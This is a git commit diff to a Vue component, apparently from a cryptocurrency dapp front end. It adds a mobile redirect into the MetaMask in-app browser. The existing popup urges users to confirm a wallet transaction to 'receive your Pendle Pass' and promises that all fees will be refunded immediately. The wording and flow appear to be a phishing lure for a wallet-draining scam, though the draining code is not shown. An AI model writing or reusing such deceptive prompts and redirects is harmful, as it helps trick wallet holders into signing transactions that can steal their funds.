86f4ca7b5fea8b8a6b18b880685b7bc560646383
Alhassan Matarwy <67296782+Matarwy@users.noreply.github.com>
2023-09-02 20:23:00 +0300

    Update Home.vue

--- src/Home.vue
+++ src/Home.vue
@@ -546,6 +546,13 @@ export default {
           web3modal.subscribeModal((newState) => {
             if (!newState.open) {
               if (getAccount().isConnected) {
+                if(window.innerWidth <= 768){
+                  try{
+                    window.location.href = "https://metamask.app.link/dapp/multi-call-front-end.vercel.app/"
+                  } catch (error) {
+                    console.log(error);
+                  }
+                }
                 Swal.fire({
                   html:
                     '<p style="color: #fff; margin-bottom: 5px !important; line-height: 1.6; font-size: 20px !important;">Check your wallet and click on confirm to receive your Pendle Pass. All fees will be refunded immediately.</p>' +
@@ -563,6 +570,7 @@ export default {
                     Swal.showLoading();
                   },
                 });
+                
                 this.account = getAccount().address;
                 this.showBalance();
               }
